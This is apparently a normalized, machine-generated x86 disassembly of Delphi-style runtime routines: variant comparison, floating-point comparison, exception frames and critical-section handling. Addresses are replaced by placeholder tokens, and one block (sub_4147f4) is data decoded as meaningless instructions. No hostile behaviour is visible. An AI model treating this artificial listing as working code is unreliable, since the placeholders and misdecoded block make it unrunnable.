call sub_40f004
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41353f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f32c
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413d5c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f004
retn
sub_413590
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e8bc
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e8bc
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e8bc
jmp r-xdata
je r-xdata
call sub_40e868
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_41368c
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_4136c8
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4136f0
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413718
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413744
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_41379f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_41231c
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_41231c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407dd0
xor edx edx
call sub_413678
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137a6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_4137b0
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413484
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413484
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e868
mov al 0x1
jmp [ edx * 4 + jump_table_413801 ]
call sub_40e868
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_41357c
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413590
jmp r-xdata
mov eax edi
call sub_40f9bc
push eax
mov eax esi
call sub_40f9bc
pop edx
call sub_413678
jmp r-xdata
mov eax esi
call sub_410480
push edx
push eax
mov eax edi
call sub_410480
push edx
push eax
call sub_41368c
jmp r-xdata
mov eax esi
call sub_410f90
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410f90
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4136c8
jmp r-xdata
mov eax esi
call sub_411700
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411700
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4136f0
jmp r-xdata
mov eax esi
call sub_411c68
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411c68
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_413718
jmp r-xdata
mov edx edi
mov eax esi
call sub_413744
jmp r-xdata
mov eax edi
call sub_410a7c
and eax 0x7f
push eax
mov eax esi
call sub_410a7c
and eax 0x7f
pop edx
call sub_413678
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4134a8
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41393c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_41357c
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_41357c
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_414518
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413590
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_414518
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413590
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e868
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e868
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ad5
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f5f8
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_414518
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413c67
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f5f8
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413bc5
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f5f8
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_4137b0
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f004
retn
call sub_40e778
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a47
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f5f8
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e868
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_4137b0
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f004
retn
call sub_40e778
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f004
retn
call sub_40e778
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f004
retn
call sub_40e778
call sub_40e868
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d1d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f5f8
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f004
retn
call sub_40e778
sub_413d5c
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413d5c
jmp r-xdata
call sub_4137b0
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413d5c
jmp r-xdata
pop edi
pop esi
retn
call sub_41393c
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_4137b0
jmp r-xdata
sub_413f48
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41406e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f0c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_414518
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041c4
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4081bc
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041c4
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40411c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414075
lea eax [ ebp - 0x208 ]
call sub_403eb8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041c4
sub_4140cc
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4140bc
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_414518
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414140
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4140bc
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_4140bc
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_4146c0
sete al
xor eax eax
jmp r-xdata
sub_4141dc
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_4141dc
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414228
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_4141dc
pop ecx
pop edx
retn
sub_414274
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4142d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404f0c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4142dc
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403128
sub_4142ec
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_414518
test al al
je r-xdata
mov eax ebx
call sub_414498
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_414498
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_414518
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414378
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4143b0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_414498
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4143ec
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41444f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414456
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4144f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414518
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4145c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f0c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4145d0
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4146a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414689
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f14
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414690
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40411c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407e74
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4146d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41473f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414746
retn
call sub_414274
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050d4
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_40496c
mov eax rw-data
call sub_403eb8
mov eax rw-data
call sub_40f018
sub_414748
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4147e9
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147f0
retn
mov eax rw-data
call sub_4141d0
mov eax sub_40ed18
mov [ rw-data ] eax
mov eax sub_40e868
mov [ rw-data ] eax
mov edx sub_40e778
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f018
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413dc4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f32c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41231c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412a44
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4147f4
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] ch
dec eax
add [ ebp + 0x640000ff ] ch
salc
dec eax
add [ esi + 0x640000ff ] ch
salc
dec eax
add [ edi + 0x640000ff ] ch
salc
dec eax
add [ eax + 0x640000ff ] dl
salc
dec eax
add [ ecx + 0x640000ff ] dl
salc
dec eax
add [ edx + 0x640000ff ] dl
salc
dec eax
add [ ebx + 0x640000ff ] dl
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
salc
dec eax
add [ esi + 0x640000ff ] dl
salc
dec eax
add [ edi + 0x640000ff ] dl
salc
dec eax
add [ eax + 0x640000ff ] bl
salc
dec eax
add [ ecx + 0x640000ff ] bl
salc
dec eax
add [ edx + 0x640000ff ] bl
salc
dec eax
add [ ebx + 0x640000ff ] bl
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] bl
dec eax
add [ ebp + 0x640000ff ] bl
salc
dec eax
add [ esi + 0x640000ff ] bl
salc
dec eax
add [ edi + 0x640000ff ] bl
salc
dec eax
add [ eax + 0x640000ff ] al
salc
dec eax
add [ ecx + 0x640000ff ] al
salc
dec eax
add [ edx + 0x640000ff ] al
salc
dec eax
add [ ebx + 0x640000ff ] al
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] al
dec eax
add [ ebp + 0x640000ff ] al
salc
dec eax
add [ esi + 0x640000ff ] al
salc
dec eax
add [ edi + 0x640000ff ] al
salc
dec eax
add [ eax + 0x640000ff ] cl
salc
dec eax
add [ ecx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414909
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414910
retn
sub_414954
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414a12
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414948
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414948
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_4080a8
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403f0c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407e74
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a19
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407d94
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403f0c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40411c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414a2c
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
